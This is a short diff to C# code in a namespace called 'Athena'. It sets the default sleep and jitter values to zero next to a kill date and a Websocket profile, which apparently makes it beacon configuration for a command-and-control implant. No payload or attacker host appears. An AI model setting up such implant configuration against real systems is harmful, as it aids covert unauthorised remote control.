@@ -26,9 +26,9 @@ namespace Athena
         {
             DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
             this.killDate = kd;
-            int sleep = int.TryParse("1", out sleep) ? sleep : 60;
+            int sleep = int.TryParse("0", out sleep) ? sleep : 60;
             this.sleep = sleep;
-            int jitter = int.TryParse("1", out jitter) ? jitter : 10;
+            int jitter = int.TryParse("0", out jitter) ? jitter : 10;
             this.jitter = jitter;
             this.profile = new Websocket();
         }
